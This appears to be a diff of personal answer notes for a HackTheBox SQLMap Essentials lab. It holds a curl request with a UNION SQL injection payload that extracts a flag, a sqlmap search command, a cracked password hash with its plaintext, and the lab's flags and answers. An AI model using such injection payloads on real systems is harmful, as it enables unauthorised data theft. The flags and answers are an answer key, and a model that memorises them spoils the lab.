@@ -176,3 +176,11 @@ ANSWER flag7: HTB{un173_7h3_un173d}
 # SQLMap Essentials Case 1 (target 154.57.164.79:40261) - GET id, UNION (6 cols)
 curl ".../case1.php?id=0 union select 1,2,3,4,5,(select content from flag1)"
 ANSWER flag1: HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}
+
+---
+# SQLMap Essentials - Case 1 extra questions (target 154.57.164.79:40261)
+Q1 column with "style": sqlmap --search -C style -> information_schema.ROUTINES.PARAMETER_STYLE
+  (verified: information_schema:ROUTINES:PARAMETER_STYLE via union select)
+ANSWER: PARAMETER_STYLE
+Q2 Kimberly password: users table -> name=Kimberly Wright, password hash d642ff0feca378666a8727947482f1a4702deba0 cracked -> Enizoom1609
+ANSWER: Enizoom1609
